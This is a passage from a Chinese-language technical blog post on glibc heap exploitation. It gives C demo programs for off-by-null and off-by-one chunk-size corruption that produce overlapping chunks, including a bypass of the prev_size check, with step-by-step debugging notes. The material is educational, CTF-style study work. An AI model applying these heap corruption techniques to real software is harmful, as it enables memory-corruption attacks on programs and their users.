class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="type">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* c_prev_size_ptr = ((<span class="type">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="type">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="type">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(<span class="built_in">strstr</span>(b2, <span class="string">&quot;DDDDDDDDDDDD&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>使用<code>glibc2.23</code>加参数<code>-g</code>编译并修改<code>rpath</code>。</p>
<h3 id="调试-7"><a href="#调试-7" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U7NK7EPN83MV5VH.png"
                      alt="图片描述"
                ><br>申请了四个堆块,a(0x111),b(0x211),c(0x111),barrier(0x111)。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DEP93F63ATZPHJZ.png"
                      alt="图片描述"
                ><br>因为我们要利用<code>off-by-null</code>把<code>chunkb</code>的<code>size</code>改为<code>0x200</code>，又因为是<code>chunkb</code>是<code>non-fast chunk</code>，将<code>b+0x1f0</code>的位置写为<code>0x200</code>绕过检查。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2Y8ADDBXUQXUG4R.png"
                      alt="图片描述"
                ><br>接下来<code>free(b)</code>后，假设<code>a</code>存在<code>off-by-null</code>漏洞，将<code>chunkb</code>改为了<code>0x200</code>大小。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C8GR9YZ8AVVR6YS.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DMWG5SBG4MM3W5S.png"
                      alt="图片描述"
                ><br>然后申请两个堆块<code>b1_real_size : 0x110</code>,<code>b2_real_size : 0x90</code>，然后<code>free(b1)</code>来绕过<code>unlink</code>检查，再<code>free(c)</code>后，会向上寻找<code>0x210</code>大小的堆块，发现<code>b1</code>是一个已经释放的<code>chunk</code>，便会合并，此时我们再去申请<code>real_size == 0x110+0x210</code>的堆块时，便控制了中间所有的<code>chunk</code>。</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="overlapping-chunks-1"><a href="#overlapping-chunks-1" class="headerlink" title="overlapping_chunks_1"></a>overlapping_chunks_1</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line">		<span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line">		<span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">	<span class="type">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">		<span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-8"><a href="#调试-8" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GHJ7RBMKB5Y8GMK.png"
                      alt="图片描述"
                ><br>首先申请三个堆块<code>p1_real:0x101</code>,<code>p2_real:0x101</code>,<code>p3_real:0x81</code>，这里只有申请<code>0x8</code>结尾的堆块才有下一个堆块<code>prev_size</code>的控制权，利用<code>off-by-one</code>漏洞。假设堆块<code>p1</code>读取时存在<code>off-by-one</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_V7X588ARHBXTSY8.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_W3A27VBAJ34ECCK.png"
                      alt="图片描述"
                ><br><code>free(p2)</code>后，利用<code>p1</code>的<code>off-by-one</code>漏洞将<code>chunk_p2</code>的<code>size</code>改为<code>0x180</code>，再次申请<code>0x178</code>大小的堆块，即可得到<code>p3</code>的控制权。</p>
<h2 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Yet another simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="type">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is a simple chunks overlapping problem&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = <span class="built_in">malloc_usable_size</span>(p1);</span><br><span class="line">  real_size_p2 = <span class="built_in">malloc_usable_size</span>(p2);</span><br><span class="line">  real_size_p3 = <span class="built_in">malloc_usable_size</span>(p3);</span><br><span class="line">  real_size_p4 = <span class="built_in">malloc_usable_size</span>(p4);</span><br><span class="line">  real_size_p5 = <span class="built_in">malloc_usable_size</span>(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="type">unsigned</span> <span class="type">char</span> *)p1+<span class="built_in">malloc_usable_size</span>(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="type">unsigned</span> <span class="type">char</span> *)p2+<span class="built_in">malloc_usable_size</span>(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="type">unsigned</span> <span class="type">char</span> *)p3+<span class="built_in">malloc_usable_size</span>(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="type">unsigned</span> <span class="type">char</span> *)p4+<span class="built_in">malloc_usable_size</span>(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="type">unsigned</span> <span class="type">char</span> *)p5+<span class="built_in">malloc_usable_size</span>(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">unsigned</span> <span class="type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="built_in">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = <span class="built_in">malloc_usable_size</span>(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="type">unsigned</span> <span class="type">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="type">unsigned</span> <span class="type">char</span> *) p3+real_size_p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">&#x27;F&#x27;</span>,<span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-9"><a href="#调试-9" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AY7EM3HWZB8HJSE.png"
                      alt="图片描述"
                ><br>首先申请5个<code>0x3e8</code>堆块，<code>p1</code>,<code>p2</code>,<code>p3</code>,<code>p4</code>,<code>p5</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K6GZGM7MWCZGCTS.png"
                      alt="图片描述"
                ><br><code>free(4)</code>后，假设<code>p1</code>存在<code>off-by-one</code>漏洞，将<code>p2</code>的<code>size</code>改为<code>0x3f0+0x3f0+0x1=0x7e1</code>大小。再次<code>free(p2)</code>将会把<code>p3</code>覆盖掉，并且会与<code>chunk_p4</code>重合，此时我们再次申请0x7d8大小的堆块即可获得chunk_p3的控制权。</p>
